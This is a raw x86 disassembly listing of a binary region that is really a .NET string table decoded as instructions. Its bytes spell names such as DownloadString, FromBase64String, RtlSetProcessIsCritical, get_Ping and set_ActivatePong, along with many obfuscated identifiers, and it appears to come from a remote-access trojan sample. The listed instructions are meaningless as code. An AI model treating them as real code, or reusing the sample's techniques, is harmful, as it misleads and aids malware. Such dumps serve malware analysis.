  408a75:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a7c:	5f                   	pop    %edi
  408a7d:	4b                   	dec    %ebx
  408a7e:	65 79 53             	gs jns 0x408ad4
  408a81:	69 7a 65 00 54 73 6f 	imul   $0x6f735400,0x65(%edx),%edi
  408a88:	48                   	dec    %eax
  408a89:	59                   	pop    %ecx
  408a8a:	66 4e                	dec    %si
  408a8c:	72 53                	jb     0x408ae1
  408a8e:	58                   	pop    %eax
  408a8f:	70 47                	jo     0x408ad8
  408a91:	66 00 59 44          	data16 add %bl,0x44(%ecx)
  408a95:	78 4e                	js     0x408ae5
  408a97:	57                   	push   %edi
  408a98:	57                   	push   %edi
  408a99:	71 69                	jno    0x408b04
  408a9b:	68 64 52 76 58       	push   $0x58765264
  408aa0:	63 48 66             	arpl   %ecx,0x66(%eax)
  408aa3:	00 6b 42             	add    %ch,0x42(%ebx)
  408aa6:	43                   	inc    %ebx
  408aa7:	64 47                	fs inc %edi
  408aa9:	72 48                	jb     0x408af3
  408aab:	74 61                	je     0x408b0e
  408aad:	49                   	dec    %ecx
  408aae:	44                   	inc    %esp
  408aaf:	4c                   	dec    %esp
  408ab0:	66 00 69 51          	data16 add %ch,0x51(%ecx)
  408ab4:	74 63                	je     0x408b19
  408ab6:	62 66 47             	bound  %esp,0x47(%esi)
  408ab9:	7a 51                	jp     0x408b0c
  408abb:	53                   	push   %ebx
  408abc:	47                   	inc    %edi
  408abd:	55                   	push   %ebp
  408abe:	59                   	pop    %ecx
  408abf:	66 00 69 64          	data16 add %ch,0x64(%ecx)
  408ac3:	53                   	push   %ebx
  408ac4:	74 68                	je     0x408b2e
  408ac6:	49                   	dec    %ecx
  408ac7:	51                   	push   %ecx
  408ac8:	4b                   	dec    %ebx
  408ac9:	6f                   	outsl  %ds:(%esi),(%dx)
  408aca:	55                   	push   %ebp
  408acb:	61                   	popa
  408acc:	66 00 52 7a          	data16 add %dl,0x7a(%edx)
  408ad0:	47                   	inc    %edi
  408ad1:	45                   	inc    %ebp
  408ad2:	78 50                	js     0x408b24
  408ad4:	69 5a 73 63 55 65 66 	imul   $0x66655563,0x73(%edx),%ebx
  408adb:	00 73 58             	add    %dh,0x58(%ebx)
  408ade:	45                   	inc    %ebp
  408adf:	54                   	push   %esp
  408ae0:	6c                   	insb   (%dx),%es:(%edi)
  408ae1:	76 7a                	jbe    0x408b5d
  408ae3:	73 65                	jae    0x408b4a
  408ae5:	68 72 66 00 7a       	push   $0x7a006672
  408aea:	4f                   	dec    %edi
  408aeb:	61                   	popa
  408aec:	64 6a 55             	fs push $0x55
  408aef:	43                   	inc    %ebx
  408af0:	6b 67 5a 4e          	imul   $0x4e,0x5a(%edi),%esp
  408af4:	74 78                	je     0x408b6e
  408af6:	66 00 44 69 62       	data16 add %al,0x62(%ecx,%ebp,2)
  408afb:	4b                   	dec    %ebx
  408afc:	4b                   	dec    %ebx
  408afd:	63 41 51             	arpl   %eax,0x51(%ecx)
  408b00:	73 4d                	jae    0x408b4f
  408b02:	45                   	inc    %ebp
  408b03:	67 7a 4e             	addr16 jp 0x408b54
  408b06:	67 00 6c 58          	add    %ch,0x58(%si)
  408b0a:	43                   	inc    %ebx
  408b0b:	53                   	push   %ebx
  408b0c:	45                   	inc    %ebp
  408b0d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408b0f:	77 55                	ja     0x408b66
  408b11:	79 52                	jns    0x408b65
  408b13:	77 52                	ja     0x408b67
  408b15:	67 00 69 55          	add    %ch,0x55(%bx,%di)
  408b19:	4e                   	dec    %esi
  408b1a:	4a                   	dec    %edx
  408b1b:	46                   	inc    %esi
  408b1c:	54                   	push   %esp
  408b1d:	44                   	inc    %esp
  408b1e:	41                   	inc    %ecx
  408b1f:	5a                   	pop    %edx
  408b20:	5a                   	pop    %edx
  408b21:	51                   	push   %ecx
  408b22:	57                   	push   %edi
  408b23:	67 00 77 61          	add    %dh,0x61(%bx)
  408b27:	69 79 59 58 58 54 70 	imul   $0x70545858,0x59(%ecx),%edi
  408b2e:	76 49                	jbe    0x408b79
  408b30:	66 58                	pop    %ax
  408b32:	67 00 74 73          	add    %dh,0x73(%si)
  408b36:	49                   	dec    %ecx
  408b37:	75 45                	jne    0x408b7e
  408b39:	56                   	push   %esi
  408b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3b:	42                   	inc    %edx
  408b3c:	44                   	inc    %esp
  408b3d:	44                   	inc    %esp
  408b3e:	59                   	pop    %ecx
  408b3f:	4e                   	dec    %esi
  408b40:	58                   	pop    %eax
  408b41:	61                   	popa
  408b42:	67 00 41 79          	add    %al,0x79(%bx,%di)
  408b46:	59                   	pop    %ecx
  408b47:	49                   	dec    %ecx
  408b48:	52                   	push   %edx
  408b49:	4a                   	dec    %edx
  408b4a:	55                   	push   %ebp
  408b4b:	42                   	inc    %edx
  408b4c:	69 67 00 43 72 79 70 	imul   $0x70797243,0x0(%edi),%esp
  408b53:	74 6f                	je     0x408bc4
  408b55:	43                   	inc    %ebx
  408b56:	6f                   	outsl  %ds:(%esi),(%dx)
  408b57:	6e                   	outsb  %ds:(%esi),(%dx)
  408b58:	66 69 67 00 68 59    	imul   $0x5968,0x0(%edi),%sp
  408b5e:	45                   	inc    %ebp
  408b5f:	43                   	inc    %ebx
  408b60:	6b 6e 72 4a          	imul   $0x4a,0x72(%esi),%ebp
  408b64:	6b 67 00 51          	imul   $0x51,0x0(%edi),%esp
  408b68:	6e                   	outsb  %ds:(%esi),(%dx)
  408b69:	54                   	push   %esp
  408b6a:	51                   	push   %ecx
  408b6b:	72 59                	jb     0x408bc6
  408b6d:	4b                   	dec    %ebx
  408b6e:	52                   	push   %edx
  408b6f:	78 71                	js     0x408be2
  408b71:	69 6d 67 00 67 65 74 	imul   $0x74656700,0x67(%ebp),%ebp
  408b78:	5f                   	pop    %edi
  408b79:	50                   	push   %eax
  408b7a:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b81:	5f                   	pop    %edi
  408b82:	50                   	push   %eax
  408b83:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408b8a:	74 65                	je     0x408bf1
  408b8c:	6d                   	insl   (%dx),%es:(%edi)
  408b8d:	2e 54                	cs push %esp
  408b8f:	68 72 65 61 64       	push   $0x64616572
  408b94:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b9b:	5f                   	pop    %edi
  408b9c:	50                   	push   %eax
  408b9d:	61                   	popa
  408b9e:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408ba5:	64 64 
  408ba7:	5f                   	pop    %edi
  408ba8:	53                   	push   %ebx
  408ba9:	65 73 73             	gs jae 0x408c1f
  408bac:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408bb3:	6e                   	outsb  %ds:(%esi),(%dx)
  408bb4:	67 00 55 54          	add    %dl,0x54(%di)
  408bb8:	46                   	inc    %esi
  408bb9:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408bbc:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bbf:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408bc6:	74 65                	je     0x408c2d
  408bc8:	6d                   	insl   (%dx),%es:(%edi)
  408bc9:	2e 44                	cs inc %esp
  408bcb:	72 61                	jb     0x408c2e
  408bcd:	77 69                	ja     0x408c38
  408bcf:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd0:	67 2e 49             	addr16 cs dec %ecx
  408bd3:	6d                   	insl   (%dx),%es:(%edi)
  408bd4:	61                   	popa
  408bd5:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408bdc:	73 
  408bdd:	74 65                	je     0x408c44
  408bdf:	6d                   	insl   (%dx),%es:(%edi)
  408be0:	2e 52                	cs push %edx
  408be2:	75 6e                	jne    0x408c52
  408be4:	74 69                	je     0x408c4f
  408be6:	6d                   	insl   (%dx),%es:(%edi)
  408be7:	65 2e 56             	gs cs push %esi
  408bea:	65 72 73             	gs jb  0x408c60
  408bed:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408bf4:	46                   	inc    %esi
  408bf5:	72 6f                	jb     0x408c66
  408bf7:	6d                   	insl   (%dx),%es:(%edi)
  408bf8:	42                   	inc    %edx
  408bf9:	61                   	popa
  408bfa:	73 65                	jae    0x408c61
  408bfc:	36 34 53             	ss xor $0x53,%al
  408bff:	74 72                	je     0x408c73
  408c01:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408c08:	61                   	popa
  408c09:	73 65                	jae    0x408c70
  408c0b:	36 34 53             	ss xor $0x53,%al
  408c0e:	74 72                	je     0x408c82
  408c10:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408c17:	6e                   	outsb  %ds:(%esi),(%dx)
  408c18:	6c                   	insb   (%dx),%es:(%edi)
  408c19:	6f                   	outsl  %ds:(%esi),(%dx)
  408c1a:	61                   	popa
  408c1b:	64 53                	fs push %ebx
  408c1d:	74 72                	je     0x408c91
  408c1f:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408c26:	74 72                	je     0x408c9a
  408c28:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408c2f:	5f                   	pop    %edi
  408c30:	41                   	inc    %ecx
  408c31:	73 53                	jae    0x408c86
  408c33:	74 72                	je     0x408ca7
  408c35:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c3c:	5f                   	pop    %edi
  408c3d:	41                   	inc    %ecx
  408c3e:	73 53                	jae    0x408c93
  408c40:	74 72                	je     0x408cb4
  408c42:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408c49:	53                   	push   %ebx
  408c4a:	74 72                	je     0x408cbe
  408c4c:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408c53:	73 74                	jae    0x408cc9
  408c55:	72 69                	jb     0x408cc0
  408c57:	6e                   	outsb  %ds:(%esi),(%dx)
  408c58:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408c5c:	73 74                	jae    0x408cd2
  408c5e:	65 6d                	gs insl (%dx),%es:(%edi)
  408c60:	2e 44                	cs inc %esp
  408c62:	72 61                	jb     0x408cc5
  408c64:	77 69                	ja     0x408ccf
  408c66:	6e                   	outsb  %ds:(%esi),(%dx)
  408c67:	67 00 67 65          	add    %ah,0x65(%bx)
  408c6b:	74 5f                	je     0x408ccc
  408c6d:	41                   	inc    %ecx
  408c6e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c72:	61                   	popa
  408c73:	74 65                	je     0x408cda
  408c75:	50                   	push   %eax
  408c76:	6f                   	outsl  %ds:(%esi),(%dx)
  408c77:	6e                   	outsb  %ds:(%esi),(%dx)
  408c78:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c7c:	74 5f                	je     0x408cdd
  408c7e:	41                   	inc    %ecx
  408c7f:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c83:	61                   	popa
  408c84:	74 65                	je     0x408ceb
  408c86:	50                   	push   %eax
  408c87:	6f                   	outsl  %ds:(%esi),(%dx)
  408c88:	6e                   	outsb  %ds:(%esi),(%dx)
  408c89:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c8d:	74 5f                	je     0x408cee
  408c8f:	45                   	inc    %ebp
  408c90:	72 72                	jb     0x408d04
  408c92:	6f                   	outsl  %ds:(%esi),(%dx)
  408c93:	72 44                	jb     0x408cd9
  408c95:	69 61 6c 6f 67 00 4e 	imul   $0x4e00676f,0x6c(%ecx),%esp
  408c9c:	52                   	push   %edx
  408c9d:	62 56 59             	bound  %edx,0x59(%esi)
  408ca0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca1:	59                   	pop    %ecx
  408ca2:	64 67 44             	fs addr16 inc %esp
  408ca5:	51                   	push   %ecx
  408ca6:	51                   	push   %ecx
  408ca7:	44                   	inc    %esp
  408ca8:	6a 7a                	push   $0x7a
  408caa:	67 00 77 77          	add    %dh,0x77(%bx)
  408cae:	73 71                	jae    0x408d21
  408cb0:	63 6f 61             	arpl   %ebp,0x61(%edi)
  408cb3:	59                   	pop    %ecx
  408cb4:	7a 66                	jp     0x408d1c
  408cb6:	47                   	inc    %edi
  408cb7:	68 00 51 59 62       	push   $0x62595100
  408cbc:	54                   	push   %esp
  408cbd:	4e                   	dec    %esi
  408cbe:	78 59                	js     0x408d19
  408cc0:	5a                   	pop    %edx
  408cc1:	7a 49                	jp     0x408d0c
  408cc3:	68 00 53 6b 53       	push   $0x536b5300
  408cc8:	52                   	push   %edx
  408cc9:	4a                   	dec    %edx
  408cca:	75 6f                	jne    0x408d3b
  408ccc:	67 4d                	addr16 dec %ebp
  408cce:	72 6b                	jb     0x408d3b
  408cd0:	53                   	push   %ebx
  408cd1:	68 00 79 54 61       	push   $0x61547900
  408cd6:	4d                   	dec    %ebp
  408cd7:	76 51                	jbe    0x408d2a
  408cd9:	72 42                	jb     0x408d1d
  408cdb:	6e                   	outsb  %ds:(%esi),(%dx)
  408cdc:	68 55 68 00 68       	push   $0x68006855
  408ce1:	71 66                	jno    0x408d49
  408ce3:	41                   	inc    %ecx
  408ce4:	6d                   	insl   (%dx),%es:(%edi)
  408ce5:	4f                   	dec    %edi
  408ce6:	67 68 58 4f 4e 47    	addr16 push $0x474e4f58
  408cec:	56                   	push   %esi
  408ced:	68 00 7a 70 77       	push   $0x77707a00
  408cf2:	41                   	inc    %ecx
  408cf3:	4e                   	dec    %esi
  408cf4:	4a                   	dec    %edx
  408cf5:	5a                   	pop    %edx
  408cf6:	53                   	push   %ebx
  408cf7:	70 54                	jo     0x408d4d
  408cf9:	66 59                	pop    %cx
  408cfb:	62 62 68             	bound  %esp,0x68(%edx)
  408cfe:	00 44 6d 72          	add    %al,0x72(%ebp,%ebp,2)
  408d02:	54                   	push   %esp
  408d03:	45                   	inc    %ebp
  408d04:	43                   	inc    %ebx
  408d05:	63 64 62 68          	arpl   %esp,0x68(%edx,%eiz,2)
  408d09:	00 73 41             	add    %dh,0x41(%ebx)
  408d0c:	69 74 55 61 5a 62 6e 	imul   $0x436e625a,0x61(%ebp,%edx,2),%esi
  408d13:	43 
  408d14:	6a 68                	push   $0x68
  408d16:	00 58 65             	add    %bl,0x65(%eax)
  408d19:	67 6c                	insb   (%dx),%es:(%di)
  408d1b:	4d                   	dec    %ebp
  408d1c:	74 64                	je     0x408d82
  408d1e:	77 71                	ja     0x408d91
  408d20:	6a 68                	push   $0x68
  408d22:	00 4a 72             	add    %cl,0x72(%edx)
  408d25:	69 58 53 4a 62 64 6b 	imul   $0x6b64624a,0x53(%eax),%ebx
  408d2c:	68 00 45 68 46       	push   $0x46684500
  408d31:	49                   	dec    %ecx
  408d32:	52                   	push   %edx
  408d33:	54                   	push   %esp
  408d34:	76 64                	jbe    0x408d9a
  408d36:	65 76 61             	gs jbe 0x408d9a
  408d39:	6c                   	insb   (%dx),%es:(%edi)
  408d3a:	68 00 49 43 4d       	push   $0x4d434900
  408d3f:	4b                   	dec    %ebx
  408d40:	55                   	push   %ebp
  408d41:	56                   	push   %esi
  408d42:	49                   	dec    %ecx
  408d43:	58                   	pop    %eax
  408d44:	6e                   	outsb  %ds:(%esi),(%dx)
  408d45:	68 00 43 6f 6d       	push   $0x6d6f4300
  408d4a:	70 75                	jo     0x408dc1
  408d4c:	74 65                	je     0x408db3
  408d4e:	48                   	dec    %eax
  408d4f:	61                   	popa
  408d50:	73 68                	jae    0x408dba
  408d52:	00 56 65             	add    %dl,0x65(%esi)
  408d55:	72 69                	jb     0x408dc0
  408d57:	66 79 48             	data16 jns 0x408da2
  408d5a:	61                   	popa
  408d5b:	73 68                	jae    0x408dc5
  408d5d:	00 46 6c             	add    %al,0x6c(%esi)
  408d60:	75 73                	jne    0x408dd5
  408d62:	68 00 67 65 74       	push   $0x74656700
  408d67:	5f                   	pop    %edi
  408d68:	45                   	inc    %ebp
  408d69:	78 65                	js     0x408dd0
  408d6b:	63 75 74             	arpl   %esi,0x74(%ebp)
  408d6e:	61                   	popa
  408d6f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408d73:	61                   	popa
  408d74:	74 68                	je     0x408dde
  408d76:	00 47 65             	add    %al,0x65(%edi)
  408d79:	74 54                	je     0x408dcf
  408d7b:	65 6d                	gs insl (%dx),%es:(%edi)
  408d7d:	70 50                	jo     0x408dcf
  408d7f:	61                   	popa
  408d80:	74 68                	je     0x408dea
  408d82:	00 67 65             	add    %ah,0x65(%edi)
  408d85:	74 5f                	je     0x408de6
  408d87:	4c                   	dec    %esp
  408d88:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d8a:	67 74 68             	addr16 je 0x408df5
  408d8d:	00 44 5a 61          	add    %al,0x61(%edx,%ebx,2)
  408d91:	61                   	popa
  408d92:	66 61                	popaw
  408d94:	4d                   	dec    %ebp
  408d95:	6f                   	outsl  %ds:(%esi),(%dx)
  408d96:	65 4c                	gs dec %esp
  408d98:	78 68                	js     0x408e02
  408d9a:	00 6d 6f             	add    %ch,0x6f(%ebp)
  408d9d:	65 52                	gs push %edx
  408d9f:	66 4c                	dec    %sp
  408da1:	56                   	push   %esi
  408da2:	67 4e                	addr16 dec %esi
  408da4:	69 00 6c 61 44 42    	imul   $0x4244616c,(%eax),%eax
  408daa:	4a                   	dec    %edx
  408dab:	41                   	inc    %ecx
  408dac:	63 65 52             	arpl   %esp,0x52(%ebp)
  408daf:	4f                   	dec    %edi
  408db0:	69 00 72 52 55 79    	imul   $0x79555272,(%eax),%eax
  408db6:	44                   	inc    %esp
  408db7:	45                   	inc    %ebp
  408db8:	46                   	inc    %esi
  408db9:	51                   	push   %ecx
  408dba:	75 50                	jne    0x408e0c
  408dbc:	52                   	push   %edx
  408dbd:	61                   	popa
  408dbe:	69 00 78 59 57 79    	imul   $0x79575978,(%eax),%eax
  408dc4:	62 4b 53             	bound  %ecx,0x53(%ebx)
  408dc7:	4b                   	dec    %ebx
  408dc8:	43                   	inc    %ebx
  408dc9:	7a 45                	jp     0x408e10
  408dcb:	64 69 00 46 6a 74 48 	imul   $0x48746a46,%fs:(%eax),%eax
  408dd2:	6b 51 7a 79          	imul   $0x79,0x7a(%ecx),%edx
  408dd6:	69 66 69 00 6d 74 72 	imul   $0x72746d00,0x69(%esi),%esp
  408ddd:	4c                   	dec    %esp
  408dde:	43                   	inc    %ebx
  408ddf:	59                   	pop    %ecx
  408de0:	6c                   	insb   (%dx),%es:(%edi)
  408de1:	44                   	inc    %esp
  408de2:	6b 6d 69 00          	imul   $0x0,0x69(%ebp),%ebp
  408de6:	55                   	push   %ebp
  408de7:	72 69                	jb     0x408e52
  408de9:	00 74 53 41          	add    %dh,0x41(%ebx,%edx,2)
  408ded:	56                   	push   %esi
  408dee:	46                   	inc    %esi
  408def:	4e                   	dec    %esi
  408df0:	6f                   	outsl  %ds:(%esi),(%dx)
  408df1:	44                   	inc    %esp
  408df2:	41                   	inc    %ecx
  408df3:	74 79                	je     0x408e6e
  408df5:	72 69                	jb     0x408e60
  408df7:	00 42 57             	add    %al,0x57(%edx)
  408dfa:	6b 62 52 74          	imul   $0x74,0x52(%edx),%esp
  408dfe:	63 63 6e             	arpl   %esp,0x6e(%ebx)
  408e01:	77 69                	ja     0x408e6c
  408e03:	00 73 64             	add    %dh,0x64(%ebx)
  408e06:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  408e0a:	58                   	pop    %eax
  408e0b:	6b 54 44 6a 00       	imul   $0x0,0x6a(%esp,%eax,2),%edx
  408e10:	4e                   	dec    %esi
  408e11:	56                   	push   %esi
  408e12:	6f                   	outsl  %ds:(%esi),(%dx)
  408e13:	7a 59                	jp     0x408e6e
  408e15:	73 53                	jae    0x408e6a
  408e17:	59                   	pop    %ecx
  408e18:	6a 52                	push   $0x52
  408e1a:	79 76                	jns    0x408e92
  408e1c:	54                   	push   %esp
  408e1d:	6a 00                	push   $0x0
  408e1f:	73 49                	jae    0x408e6a
  408e21:	78 78                	js     0x408e9b
  408e23:	4b                   	dec    %ebx
  408e24:	41                   	inc    %ecx
  408e25:	62 41 72             	bound  %eax,0x72(%ecx)
  408e28:	4f                   	dec    %edi
  408e29:	59                   	pop    %ecx
  408e2a:	6a 00                	push   $0x0
  408e2c:	6c                   	insb   (%dx),%es:(%edi)
  408e2d:	57                   	push   %edi
  408e2e:	68 66 42 59 59       	push   $0x59594266
  408e33:	79 6b                	jns    0x408ea0
  408e35:	4a                   	dec    %edx
  408e36:	63 6a 00             	arpl   %ebp,0x0(%edx)
  408e39:	46                   	inc    %esi
  408e3a:	4e                   	dec    %esi
  408e3b:	6d                   	insl   (%dx),%es:(%edi)
  408e3c:	44                   	inc    %esp
  408e3d:	4c                   	dec    %esp
  408e3e:	49                   	dec    %ecx
  408e3f:	61                   	popa
  408e40:	44                   	inc    %esp
  408e41:	53                   	push   %ebx
  408e42:	70 6a                	jo     0x408eae
  408e44:	00 78 42             	add    %bh,0x42(%eax)
  408e47:	6b 4a 75 7a          	imul   $0x7a,0x75(%edx),%ecx
  408e4b:	52                   	push   %edx
  408e4c:	6c                   	insb   (%dx),%es:(%edi)
  408e4d:	55                   	push   %ebp
  408e4e:	71 6a                	jno    0x408eba
  408e50:	00 69 78             	add    %ch,0x78(%ecx)
  408e53:	70 42                	jo     0x408e97
  408e55:	47                   	inc    %edi
  408e56:	54                   	push   %esp
  408e57:	6f                   	outsl  %ds:(%esi),(%dx)
  408e58:	52                   	push   %edx
  408e59:	63 77 6a             	arpl   %esi,0x6a(%edi)
  408e5c:	00 72 66             	add    %dh,0x66(%edx)
  408e5f:	67 54                	addr16 push %esp
  408e61:	4d                   	dec    %ebp
  408e62:	6a 5a                	push   $0x5a
  408e64:	6c                   	insb   (%dx),%es:(%edi)
  408e65:	4a                   	dec    %edx
  408e66:	76 77                	jbe    0x408edf
  408e68:	41                   	inc    %ecx
  408e69:	68 7a 6a 00 6c       	push   $0x6c006a7a
  408e6e:	43                   	inc    %ebx
  408e6f:	70 51                	jo     0x408ec2
  408e71:	7a 6d                	jp     0x408ee0
  408e73:	6e                   	outsb  %ds:(%esi),(%dx)
  408e74:	43                   	inc    %ebx
  408e75:	57                   	push   %edi
  408e76:	56                   	push   %esi
  408e77:	46                   	inc    %esi
  408e78:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  408e7b:	4b                   	dec    %ebx
  408e7c:	74 55                	je     0x408ed3
  408e7e:	79 71                	jns    0x408ef1
  408e80:	75 79                	jne    0x408efb
  408e82:	55                   	push   %ebp
  408e83:	57                   	push   %edi
  408e84:	54                   	push   %esp
  408e85:	4b                   	dec    %ebx
  408e86:	6b 00 70             	imul   $0x70,(%eax),%eax
  408e89:	43                   	inc    %ebx
  408e8a:	4a                   	dec    %edx
  408e8b:	4e                   	dec    %esi
  408e8c:	67 50                	addr16 push %eax
  408e8e:	61                   	popa
  408e8f:	4a                   	dec    %edx
  408e90:	56                   	push   %esi
  408e91:	5a                   	pop    %edx
  408e92:	4c                   	dec    %esp
  408e93:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  408e96:	6a 54                	push   $0x54
  408e98:	51                   	push   %ecx
  408e99:	6d                   	insl   (%dx),%es:(%edi)
  408e9a:	66 53                	push   %bx
  408e9c:	46                   	inc    %esi
  408e9d:	64 4d                	fs dec %ebp
  408e9f:	6b 00 74             	imul   $0x74,(%eax),%eax
  408ea2:	41                   	inc    %ecx
  408ea3:	51                   	push   %ecx
  408ea4:	67 6a 5a             	addr16 push $0x5a
  408ea7:	68 44 54 59 6b       	push   $0x6b595444
  408eac:	00 41 73             	add    %al,0x73(%ecx)
  408eaf:	79 6e                	jns    0x408f1f
  408eb1:	63 43 61             	arpl   %eax,0x61(%ebx)
  408eb4:	6c                   	insb   (%dx),%es:(%edi)
  408eb5:	6c                   	insb   (%dx),%es:(%edi)
  408eb6:	62 61 63             	bound  %esp,0x63(%ecx)
  408eb9:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ebc:	65 6d                	gs insl (%dx),%es:(%edi)
  408ebe:	6f                   	outsl  %ds:(%esi),(%dx)
  408ebf:	74 65                	je     0x408f26
  408ec1:	43                   	inc    %ebx
  408ec2:	65 72 74             	gs jb  0x408f39
  408ec5:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408ecc:	56                   	push   %esi
  408ecd:	61                   	popa
  408ece:	6c                   	insb   (%dx),%es:(%edi)
  408ecf:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408ed6:	43 
  408ed7:	61                   	popa
  408ed8:	6c                   	insb   (%dx),%es:(%edi)
  408ed9:	6c                   	insb   (%dx),%es:(%edi)
  408eda:	62 61 63             	bound  %esp,0x63(%ecx)
  408edd:	6b 00 54             	imul   $0x54,(%eax),%eax
  408ee0:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408ee7:	6c                   	insb   (%dx),%es:(%edi)
  408ee8:	62 61 63             	bound  %esp,0x63(%ecx)
  408eeb:	6b 00 52             	imul   $0x52,(%eax),%eax
  408eee:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408ef5:	4b 65 
  408ef7:	79 50                	jns    0x408f49
  408ef9:	65 72 6d             	gs jb  0x408f69
  408efc:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408f03:	68 65 63 6b 00       	push   $0x6b6365
  408f08:	46                   	inc    %esi
  408f09:	6c                   	insb   (%dx),%es:(%edi)
  408f0a:	75 73                	jne    0x408f7f
  408f0c:	68 46 69 6e 61       	push   $0x616e6946
  408f11:	6c                   	insb   (%dx),%es:(%edi)
  408f12:	42                   	inc    %edx
  408f13:	6c                   	insb   (%dx),%es:(%edi)
  408f14:	6f                   	outsl  %ds:(%esi),(%dx)
  408f15:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408f18:	67 71 72             	addr16 jno 0x408f8d
  408f1b:	71 51                	jno    0x408f6e
  408f1d:	71 56                	jno    0x408f75
  408f1f:	50                   	push   %eax
  408f20:	48                   	dec    %eax
  408f21:	6c                   	insb   (%dx),%es:(%edi)
  408f22:	6b 00 43             	imul   $0x43,(%eax),%eax
  408f25:	73 58                	jae    0x408f7f
  408f27:	5a                   	pop    %edx
  408f28:	55                   	push   %ebp
  408f29:	7a 68                	jp     0x408f93
  408f2b:	63 4a 51             	arpl   %ecx,0x51(%edx)
  408f2e:	50                   	push   %eax
  408f2f:	48                   	dec    %eax
  408f30:	41                   	inc    %ecx
  408f31:	6c                   	insb   (%dx),%es:(%edi)
  408f32:	00 71 6d             	add    %dh,0x6d(%ecx)
  408f35:	76 51                	jbe    0x408f88
  408f37:	57                   	push   %edi
  408f38:	76 4c                	jbe    0x408f86
  408f3a:	71 4c                	jno    0x408f88
  408f3c:	6c                   	insb   (%dx),%es:(%edi)
  408f3d:	00 52 74             	add    %dl,0x74(%edx)
  408f40:	6c                   	insb   (%dx),%es:(%edi)
  408f41:	53                   	push   %ebx
  408f42:	65 74 50             	gs je  0x408f95
  408f45:	72 6f                	jb     0x408fb6
  408f47:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f4a:	73 49                	jae    0x408f95
  408f4c:	73 43                	jae    0x408f91
  408f4e:	72 69                	jb     0x408fb9
  408f50:	74 69                	je     0x408fbb
  408f52:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f55:	00 4e 65             	add    %cl,0x65(%esi)
  408f58:	74 77                	je     0x408fd1
  408f5a:	6f                   	outsl  %ds:(%esi),(%dx)
  408f5b:	72 6b                	jb     0x408fc8
  408f5d:	43                   	inc    %ebx
  408f5e:	72 65                	jb     0x408fc5
  408f60:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f63:	74 69                	je     0x408fce
  408f65:	61                   	popa
  408f66:	6c                   	insb   (%dx),%es:(%edi)
  408f67:	00 53 79             	add    %dl,0x79(%ebx)
  408f6a:	73 74                	jae    0x408fe0
  408f6c:	65 6d                	gs insl (%dx),%es:(%edi)
  408f6e:	2e 53                	cs push %ebx
  408f70:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408f74:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408f7b:	6e 
  408f7c:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f7f:	61                   	popa
  408f80:	6c                   	insb   (%dx),%es:(%edi)
  408f81:	00 57 69             	add    %dl,0x69(%edi)
  408f84:	6e                   	outsb  %ds:(%esi),(%dx)
  408f85:	64 6f                	outsl  %fs:(%esi),(%dx)
  408f87:	77 73                	ja     0x408ffc
  408f89:	50                   	push   %eax
  408f8a:	72 69                	jb     0x408ff5
  408f8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f8d:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f90:	61                   	popa
  408f91:	6c                   	insb   (%dx),%es:(%edi)
  408f92:	00 67 65             	add    %ah,0x65(%edi)
  408f95:	74 5f                	je     0x408ff6
  408f97:	49                   	dec    %ecx
  408f98:	6e                   	outsb  %ds:(%esi),(%dx)
  408f99:	74 65                	je     0x409000
  408f9b:	72 76                	jb     0x409013
  408f9d:	61                   	popa
  408f9e:	6c                   	insb   (%dx),%es:(%edi)
  408f9f:	00 73 65             	add    %dh,0x65(%ebx)
